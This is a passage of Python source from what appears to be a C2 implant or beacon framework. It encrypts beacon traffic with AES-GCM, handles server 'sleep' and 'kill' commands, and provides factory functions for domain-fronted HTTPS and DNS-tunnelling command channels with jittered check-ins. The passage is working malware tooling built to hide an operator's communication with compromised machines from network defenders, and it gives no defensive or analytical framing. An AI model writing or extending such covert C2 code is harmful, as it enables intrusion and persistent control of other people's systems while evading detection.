        pycryptodome is a hard dependency — no insecure fallback.
        """
        from Crypto.Cipher import AES

        key = hashlib.sha256(self.encryption_key).digest()
        nonce = os.urandom(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext)

    def _decrypt(self, data: bytes) -> bytes:
        """Decrypt AES-256-GCM encrypted data."""
        from Crypto.Cipher import AES

        try:
            decoded = base64.b64decode(data)
            key = hashlib.sha256(self.encryption_key).digest()
            nonce = decoded[:12]
            tag = decoded[12:28]
            ciphertext = decoded[28:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)
        except Exception as e:
            logger.exception("Decryption failed: %s", e)
            return b""

    def _handle_command(self, response: BeaconResponse) -> None:
        """Handle commands from C2 server."""
        if response.command == "sleep":
            # Update sleep interval
            data = response.data or {}
            new_interval = data.get("interval", 60)
            if self.heartbeat:
                self.heartbeat.update_interval(new_interval)

        elif response.command == "kill":
            # Terminate beacon
            self.disconnect()

        # Add more command handlers as needed

    def _generate_id(self) -> str:
        """Generate unique message ID."""
        import secrets

        return hashlib.sha256(
            f"{time.time()}{secrets.randbelow(1_000_000)}".encode(),
        ).hexdigest()[:16]

    def get_status(self) -> dict[str, Any]:
        """Get channel status."""
        return {
            "status": self.status.value,
            "protocol": self.config.protocol.value,
            "primary_host": self.config.primary_host,
            "domain_fronting": self.domain_fronter is not None,
            "dns_tunneling": self.dns_tunneler is not None,
            "heartbeat": self.heartbeat.get_status() if self.heartbeat else None,
        }


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================

def create_fronted_channel(
    fronting_domain: str,
    actual_host: str,
    port: int = 443,
    sleep_interval: int = 60,
    jitter_min: int = 10,
    jitter_max: int = 25,
) -> C2Channel:
    """Create a domain-fronted HTTPS C2 channel.

    Args:
        fronting_domain: CDN domain for fronting
        actual_host: Actual C2 server host
        port: HTTPS port
        sleep_interval: Base check-in interval
        jitter_min: Minimum jitter percentage
        jitter_max: Maximum jitter percentage

    Returns:
        Configured C2Channel

    """
    config = C2Config(
        protocol=C2Protocol.HTTPS,
        primary_host=fronting_domain,
        primary_port=port,
        fronting_domain=fronting_domain,
        actual_host=actual_host,
        sleep_interval=sleep_interval,
        jitter_min=jitter_min,
        jitter_max=jitter_max,
    )
    return C2Channel(config)


def create_dns_channel(
    c2_domain: str,
    sleep_interval: int = 120,
    jitter_min: int = 15,
    jitter_max: int = 30,
) -> C2Channel:
    """Create a DNS tunneling C2 channel (Strategically Hardened).

    Args:
        c2_domain: Base domain for DNS queries
        sleep_interval: Base check-in interval
        jitter_min: Minimum jitter percentage
        jitter_max: Maximum jitter percentage

    Returns:
        Configured C2Channel

    """
    config = C2Config(
        protocol=C2Protocol.DNS,
        dns_domain=c2_domain,
        sleep_interval=sleep_interval,
        jitter_min=jitter_min,
        jitter_max=jitter_max,
    )

    return C2Channel(config)
